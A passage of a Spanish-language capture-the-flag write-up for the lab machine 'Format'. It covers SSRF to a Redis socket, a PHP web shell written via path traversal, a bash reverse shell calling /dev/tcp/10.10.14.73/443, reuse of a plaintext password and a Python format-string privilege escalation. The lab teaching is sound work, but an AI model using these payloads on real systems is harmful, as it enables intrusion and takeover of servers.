+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>etc\/hostname\&#34;&gt;format\n&lt;\/div&gt;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>Archivo: 
+</span></span></code></pre></div>
+<p>Al intentar cargar el archivo PHP no funcionaba porque me descargaba el archivo directamente en vez de interpretarlo, en este momento decidí revisar la configuración de <code>nginx</code> para ver como estaba montado esto por detrás.</p>
+<h2 id="interacting-with-redis-database">Interacting with Redis Database</h2>
+<p>Al revisar el archivo <code>../../../../../../../etc/nginx/sites-enabled/default</code></p>
+<p>Encontramos lo siguiente que me pareció interesante ya que si intentamos cargar un recurso <code>/static/1/2</code> se convertirá en <code>http://1.microbucket.htb/2</code>.
+<img src="images/Screenshot_19.png" alt="Write-up Image"></p>
+<p>Ahora recordemos la forma en la que la aplicación se conecta a la base de datos Redis.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$redis = <span style="color:#fff;font-weight:bold">new</span> Redis();
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>    $redis-&gt;<span style="color:#007f7f">connect</span>(<span style="color:#0ff;font-weight:bold">&#39;/var/run/redis/redis.sock&#39;</span>);</span></span></code></pre></div>
+<p>Se conecta al socket donde se encuentra redis alojado.</p>
+<p>Es decir, si internamente podamos dar con http://unix:/var/run/redis/redis.sock:TEST.microbucket.htb/2 por ejemplo, mandaremos una solicitud al socket donde se encuentra redis y como en redis se suele poder acceder sin necesidad de autenticación significa que podemos controlar la base de datos de la aplicación y por ende podríamos asignarnos el VIP que hemos visto antes e intentar explotar la inyección de comandos que hemos visto anteriormente.</p>
+<p>Sinceramente para ser una máquina de dificultad intermedia me parece un poco rebuscado, pero podemos intentarlo.</p>
+<p>Antes de nada vamos a comprobar nuestra teoría.</p>
+<p>Vamos a intentar modificar nuestro nombre de usuario a <code>pwned</code></p>
+<p>Después de un rato y de ver una pista me di cuenta de que el método hacía que no fuera posible comunicarse con la instancia de Redis.</p>
+<p>Si usamos el método <a href="https://redis.io/docs/latest/commands/hset/">HSET</a> que corresponde al comando en Redis, podemos settear el valor a un campo especifico dentro de un campo.</p>
+<p>Es decir, en redis <code>redis&gt; HSET myhash field1 &quot;Hello&quot;</code> lo que hacemos es asignar en <code>myhash</code> al campo <code>field1</code> el valor <code>Hello</code></p>
+<p>Si revisamos el código encontramos las siguiente líneas.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$redis-&gt;<span style="color:#007f7f">HSET</span>(trim($_POST[<span style="color:#0ff;font-weight:bold">&#39;username&#39;</span>]), <span style="color:#0ff;font-weight:bold">&#34;username&#34;</span>, trim($_POST[<span style="color:#0ff;font-weight:bold">&#39;username&#39;</span>]));
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>        $redis-&gt;<span style="color:#007f7f">HSET</span>(trim($_POST[<span style="color:#0ff;font-weight:bold">&#39;username&#39;</span>]), <span style="color:#0ff;font-weight:bold">&#34;password&#34;</span>, trim($_POST[<span style="color:#0ff;font-weight:bold">&#39;password&#39;</span>]));
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>        $redis-&gt;<span style="color:#007f7f">HSET</span>(trim($_POST[<span style="color:#0ff;font-weight:bold">&#39;username&#39;</span>]), <span style="color:#0ff;font-weight:bold">&#34;first-name&#34;</span>, trim($_POST[<span style="color:#0ff;font-weight:bold">&#39;first-name&#39;</span>]));
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>        $redis-&gt;<span style="color:#007f7f">HSET</span>(trim($_POST[<span style="color:#0ff;font-weight:bold">&#39;username&#39;</span>]), <span style="color:#0ff;font-weight:bold">&#34;last-name&#34;</span>, trim($_POST[<span style="color:#0ff;font-weight:bold">&#39;last-name&#39;</span>]));
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>        $redis-&gt;<span style="color:#007f7f">HSET</span>(trim($_POST[<span style="color:#0ff;font-weight:bold">&#39;username&#39;</span>]), <span style="color:#0ff;font-weight:bold">&#34;pro&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;false&#34;</span>); <span style="color:#007f7f">//not ready yet, license keys coming soon
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span><span style="color:#007f7f"></span>        $_SESSION[<span style="color:#0ff;font-weight:bold">&#39;username&#39;</span>] = trim($_POST[<span style="color:#0ff;font-weight:bold">&#39;username&#39;</span>]);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>        header(<span style="color:#0ff;font-weight:bold">&#34;Location: /dashboard?message=Registration successful!&amp;status=success&#34;</span>);</span></span></code></pre></div>
+<p>Vamos a modificar el campo <code>first-name</code> ya que en los blogs que creamos se refleja este campo.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-javascript" data-lang="javascript"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span><span style="color:#fff;font-weight:bold">if</span>(siteOwner.length &gt; <span style="color:#ff0;font-weight:bold">0</span>) {
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>            $(<span style="color:#0ff;font-weight:bold">&#34;.your-blog&#34;</span>).css(<span style="color:#0ff;font-weight:bold">&#34;display&#34;</span>, <span style="color:#0ff;font-weight:bold">&#34;flex&#34;</span>);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>            $(<span style="color:#0ff;font-weight:bold">&#34;.user-first-name&#34;</span>).text(&lt;?php echo getFirstName(); ?&gt;);
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>        }</span></span></code></pre></div>
+<p>Entonces vamos a modificar <code>first-name</code> del usuario <code>pointed</code> para que valga <code>pwned</code></p>
+<p>Esto sería hacer
+<code>HSET pointed first-name &quot;pwned&quot;</code></p>
+<p>Vamos a probar.
+Importante cambiar el método a <strong>HSET</strong> ya que nos estamos comunicando directamente con el Socket de Redis y esto es para que entienda la solicitud.
+<img src="images/Screenshot_21.png" alt="Write-up Image"></p>
+<p>Ahora si accedemos a nuestro blog&hellip;
+<img src="images/Screenshot_22.png" alt="Write-up Image"></p>
+<p>Vamos a asignarnos el VIP.
+<img src="images/Screenshot_24.png" alt="Write-up Image"></p>
+<p>Y conseguimos el VIP.
+<del>Esto me ha parecido demasiado complicado para una máquina de dificultad media..</del>
+<img src="images/Screenshot_23.png" alt="Write-up Image"></p>
+<h1 id="rce---foothold">RCE -&gt; Foothold</h1>
+<p>Ahora siendo VIP podemos volver atrás y vemos que según la función <code>privisonProUser()</code> ahora se debe de haber creado un directorio <code>/uploads</code> y además deberíamos de tener permisos de escritura.</p>
+<p>Nos podríamos aprovechar de la vulnerabilidad encontrada anteriormente para intentar crear un archivo PHP en esa ruta a ver si esta vez se interpreta en vez de descargarse.
+<img src="images/Screenshot_25.png" alt="Write-up Image"></p>
+<p><code>POST /edit/index.php</code>
+<img src="images/Screenshot_27.png" alt="Write-up Image"></p>
+<p>¡Y funciona!
+<img src="images/Screenshot_26.png" alt="Write-up Image"></p>
+<p>Creamos una pequeña web shell.
+<img src="images/Screenshot_28.png" alt="Write-up Image"></p>
+
+
+
+
+
+
+<pre tabindex="0"><code>id=../uploads/test.php&amp;header=&lt;?php+echo+&#34;&lt;pre&gt;&#34;+.+shell_exec($_GET[&#34;cmd&#34;])+.+&#34;&lt;/pre&gt;&#34;;?&gt;</code></pre>
+<p>Y conseguimos ejecución remota de comandos.
+<img src="images/Screenshot_29.png" alt="Write-up Image"></p>
+<p>Ahora para mandarnos la consola, nos ponemos en escucha con <code>pwncat-cs</code> por el puerto 443.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>$ sudo pwncat-cs -lp <span style="color:#ff0;font-weight:bold">443</span>
+</span></span></code></pre></div>
+<p>Ahora al acceder a <code>http://test.microblog.htb/uploads/test.php?cmd=bash%20-c%20%22bash%20-i%20%3E%26%20/dev/tcp/10.10.14.73/443%200%3E%261%22</code></p>
+<p>Conseguimos la consola.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>(remote) www-data@format:/var/www/microblog/test/uploads$ whoami
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>www-data
+</span></span></code></pre></div>
+<h1 id="user-pivoting">User Pivoting</h1>
+<p>Encontramos los usuarios <code>cooper</code> y <code>git</code> en el sistema.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>(remote) www-data@format:/var$ cat /etc/passwd | grep bash
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>root:x:0:0:root:/root:/bin/bash
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>cooper:x:1000:1000::/home/cooper:/bin/bash
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>git:x:104:111:Git Version Control,,,:/home/git:/bin/bash
+</span></span></code></pre></div>
+<p>Ahora podemos intentar ver la base de datos de Redis e intentar crackear los hashes de los usuarios que nos encontremos.</p>
+<p>Además justo se ejecutó el script que esta máquina tiene por detrás para limpiar la base de datos de Redis, así que me viene perfecto para poder enumerar lo que estaba originalmente.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>(remote) www-data@format:/var$ redis-cli -s /var/run/redis/redis.sock 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>redis /var/run/redis/redis.sock&gt; keys *
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>1) &#34;cooper.dooper&#34;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>2) &#34;cooper.dooper:sites&#34;
+</span></span></code></pre></div>
+<p>Vemos que <code>cooper.dooper</code> tiene de contraseña <code>zooperdoopercooper</code>, ni hasheada ni nada&hellip;</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 1</span><span>redis /var/run/redis/redis.sock&gt; HGETALL cooper.dooper
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 2</span><span> 1) &#34;username&#34;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 3</span><span> 2) &#34;cooper.dooper&#34;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 4</span><span> 3) &#34;password&#34;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 5</span><span> 4) &#34;zooperdoopercooper&#34;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 6</span><span> 5) &#34;first-name&#34;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 7</span><span> 6) &#34;Cooper&#34;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 8</span><span> 7) &#34;last-name&#34;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272"> 9</span><span> 8) &#34;Dooper&#34;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">10</span><span> 9) &#34;pro&#34;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">11</span><span>10) &#34;false&#34;
+</span></span></code></pre></div>
+<p>Ahora podemos migrar de usuario</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>(remote) www-data@format:/var$ su cooper
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>Password: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>cooper@format:/var$ 
+</span></span></code></pre></div>
+<p>Podemos leer la flag de usuario.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>cooper@format:~$ cat user.txt 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>b19c37fb3a5040...
+</span></span></code></pre></div>
+<h1 id="privilege-escalation">Privilege Escalation</h1>
+<p>Podemos ejecutar como <code>root</code> el binario <code>/usr/bin/license</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>cooper@format:~$ sudo -l
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>[sudo] password for cooper: 
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>Matching Defaults entries for cooper on format:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>    env_reset, mail_badpass,
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span><span style="color:#f00"></span>User cooper may run the following commands on format:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8</span><span>    (root) /usr/bin/license
+</span></span></code></pre></div>
+<p>Vemos que no es un binario si no un script en Python</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>cooper@format:~$ file /usr/bin/license
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>/usr/bin/license: Python script, ASCII text executable
+</span></span></code></pre></div>
+<p>Vemos que carga el contenido de <code>/root/license/secret</code> y utilizando una función de derivación de clave (KDF), deriva una clave de cifrado a partir del secreto y un salt predefinido. La clave resultante se codifica en base64 para su uso en criptografía o almacenamiento seguro.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>secret = [line.strip() for line in open(&#34;/root/license/secret&#34;)][0]
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>secret_encoded = secret.encode()
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>salt = b&#39;microblogsalt123&#39;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>kdf = PBKDF2HMAC(algorithm=hashes.SHA256(),length=32,salt=salt,iterations=100000,backend=default_backend())
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>encryption_key = base64.urlsafe_b64encode(kdf.derive(secret_encoded))
+</span></span></code></pre></div>
+<p>Investigando y por el nombre de la máquina encontré <a href="https://www.geeksforgeeks.org/vulnerability-in-str-format-in-python/">esta publicación</a> donde se explica una vulnerabilidad por la cual podemos filtrar datos en tiempo de ejecución accediendo a los atributos de otros objetos que no deberíamos.</p>
+<p>Todo esto ocurre en la función <code>format</code> de los strings.
+<img src="images/Screenshot_30.png" alt="Write-up Image"></p>
+<p>En el código vemos que solo hay una coincidencia.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>prefix = <span style="color:#0ff;font-weight:bold">&#34;microblog&#34;</span>
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>    username = r.hget(args.provision, <span style="color:#0ff;font-weight:bold">&#34;username&#34;</span>).decode()
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>    firstlast = r.hget(args.provision, <span style="color:#0ff;font-weight:bold">&#34;first-name&#34;</span>).decode() + r.hget(args.provision, <span style="color:#0ff;font-weight:bold">&#34;last-name&#34;</span>).decode()
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>    license_key = (prefix + username + <span style="color:#0ff;font-weight:bold">&#34;</span><span style="color:#0ff;font-weight:bold">{license.license}</span><span style="color:#0ff;font-weight:bold">&#34;</span> + firstlast).format(license=l)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>    <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">&#34;&#34;</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>    <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">&#34;Plaintext license key:&#34;</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>    <span style="color:#fff;font-weight:bold">print</span>(<span style="color:#0ff;font-weight:bold">&#34;------------------------------------------------------&#34;</span>)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8</span><span>    <span style="color:#fff;font-weight:bold">print</span>(license_key)</span></span></code></pre></div>
+<p>Los usuarios provisionados son los que ya tienen una entrada en <code>/root/license/keys</code></p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>existing_keys = open(&#34;/root/license/keys&#34;, &#34;r&#34;)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>    all_keys = existing_keys.readlines()
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>    for user_key in all_keys:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>        if(user_key.split(&#34;:&#34;)[0] == args.provision):
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>            print(&#34;&#34;)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>            print(&#34;License key has already been provisioned for this user&#34;)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span>            print(&#34;&#34;)
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8</span><span>            sys.exit()
+</span></span></code></pre></div>
+<p>El primer paso es crear un usuario no provisionado, creamos un usuario a través del sitio web.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>cooper@format:/usr/bin$ redis-cli -s /var/run/redis/redis.sock
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span>redis /var/run/redis/redis.sock&gt; keys *
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span>1) &#34;pointed&#34;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>2) &#34;cooper.dooper&#34;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>3) &#34;PHPREDIS_SESSION:97vle27go9t2gt324n5dqre1n7&#34;
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span>4) &#34;cooper.dooper:sites&#34;
+</span></span></code></pre></div>
+<p>Le podemos provisionar ahora y vemos que funciona.</p>
+
+
+
+
+
+
+<div class="highlight"><pre tabindex="0" style="color:#e5e5e5;background-color:#000;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-console" data-lang="console"><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">1</span><span>cooper@format:/usr/bin$ sudo /usr/bin/license -p pointed
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">2</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">3</span><span><span style="color:#f00"></span>Plaintext license key:
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">4</span><span>------------------------------------------------------
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">5</span><span>microblogpointed3u6jc&#34;D]GQ&#34;5Of@iNd&#39;j&#39;6&amp;~&gt;+Xa@~C;:&amp;JW4y1Ppointedpointed
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">6</span><span><span style="color:#f00">
+</span></span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">7</span><span><span style="color:#f00"></span>Encrypted license key (distribute to customer):
+</span></span><span style="display:flex;"><span style="white-space:pre;-webkit-user-select:none;user-select:none;margin-right:0.4em;padding:0 0.4em 0 0.4em;color:#727272">8</span><span>------------------------------------------------------
